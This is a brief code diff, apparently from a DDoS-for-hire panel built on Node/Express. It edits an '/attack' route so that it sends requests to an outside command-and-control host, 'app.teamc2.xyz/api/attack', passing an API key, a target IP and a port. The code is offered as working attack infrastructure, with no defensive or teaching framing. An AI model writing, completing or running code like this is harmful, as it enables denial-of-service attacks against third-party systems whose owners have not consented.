@@ -164,7 +164,7 @@ app.post("/attack", async (req, res) => {
     // ================= TARGET API =================
 
     const url =
-      `http://url.com` +
+      `http://app.teamc2.xyz/api/attack` +
       `?api_key=${API_KEY}` +
       `&target=${ip}` +
       `&port=${port}` +
